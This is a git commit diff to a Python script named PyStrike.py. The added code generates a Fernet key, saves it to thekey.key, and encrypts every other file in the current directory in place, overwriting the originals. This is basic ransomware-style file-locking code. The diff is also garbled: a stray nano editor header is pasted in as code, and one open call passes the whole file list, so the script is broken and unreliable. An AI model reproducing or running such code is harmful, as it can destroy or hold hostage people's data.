41077fd910348180326558d5fc0fc735fdffed5b
fastfir <95661133+fastfir@users.noreply.github.com>
2022-06-10 08:25:21 -0700

    Update PyStrike.py

--- PyStrike.py
+++ PyStrike.py
@@ -1,8 +1,19 @@
+  GNU nano 5.4                                                               PyStrike.py                                                                        
+from cryptography.fernet import Fernet
 import os
 files = []
-for files in os.listdir():
-    if file == "PyStriker.py":
+for file in os.listdir():
+    if file == "PyStrike.py" or file == "thekey.key":
         continue
-    files.append(file)
-        
+    if os.path.isfile(file):
+        files.append(file)
 print(files)
+key = Fernet.generate_key()
+with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+for file in files:
+        with open(files, "rb")as thefile:
+                contents = thefile.read()
+        encryption = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+                thefile.write(encryption)
